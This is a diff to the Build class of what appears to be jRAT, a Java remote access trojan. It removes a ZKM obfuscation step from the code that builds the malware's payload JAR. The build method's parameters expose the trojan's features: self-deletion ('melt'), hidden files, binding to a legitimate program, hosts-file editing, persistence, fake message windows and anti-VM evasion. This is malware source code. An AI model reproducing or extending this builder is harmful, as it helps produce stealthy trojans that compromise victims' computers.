@@ -39,9 +39,6 @@ import se.jrat.controller.addons.PluginList;
 import se.jrat.controller.addons.StubPlugin;
 import se.jrat.controller.listeners.BuildListener;
 import se.jrat.controller.ui.dialogs.DialogSummary;
-import se.jrat.controller.utils.ZkmUtils;
-
-import com.redpois0n.zkmlib.Configuration;
 
 public class Build {
 
@@ -54,10 +51,8 @@ public class Build {
 	}
 
 	@SuppressWarnings("resource")
-	public static void build(BuildListener listener, File buildFrom, File file, String[] addresses, String id, String pass, boolean dontInstall, int droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean runNextBoot, boolean hiddenFile, boolean bind, String bindpath, String bindname, int droptarget, boolean mutex, int mutexport, PluginList pluginlist, boolean timeout, int timeoutms, boolean delay, int delayms, boolean edithost, String hosttext, boolean overwritehost, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean handleerr, boolean persistance, int persistancems, boolean debugmsg, OSConfig osconfig, boolean summary, Configuration zkm, boolean antivm) {
+	public static void build(BuildListener listener, File buildFrom, File file, String[] addresses, String id, String pass, boolean dontInstall, int droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean runNextBoot, boolean hiddenFile, boolean bind, String bindpath, String bindname, int droptarget, boolean mutex, int mutexport, PluginList pluginlist, boolean timeout, int timeoutms, boolean delay, int delayms, boolean edithost, String hosttext, boolean overwritehost, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean handleerr, boolean persistance, int persistancems, boolean debugmsg, OSConfig osconfig, boolean summary, boolean antivm) {
 		listener.start();
-
-		boolean obfuscate = zkm != null;
 		
 		if (!file.getName().toLowerCase().endsWith(".jar")) {
 			file = new File(file.getAbsolutePath() + ".jar");
@@ -89,11 +84,7 @@ public class Build {
 			tempCryptedNotRunnableJar = File.createTempFile(Constants.NAME + "-Builder-Installer-Temp" + (new Random()).nextInt(), ".jar");
 			long start = System.currentTimeMillis();
 			
-			if (obfuscate) {
-				output = File.createTempFile(Constants.NAME + "-Builder-Temp", ".jar");
-			} else {
-				output = file;
-			}
+			output = file;
 
 			inputStub = new ZipFile(buildFrom);
 
@@ -327,13 +318,7 @@ public class Build {
 			}
 
 			inputStub.close();
-			outputStub.close();
-			
-			if (obfuscate) {
-				zkm.setInput(output);
-				zkm.setOutput(file);
-				ZkmUtils.obfuscateAtBuild(zkm, listener);			
-			}					
+			outputStub.close();		
 
 			long end = System.currentTimeMillis();
 			
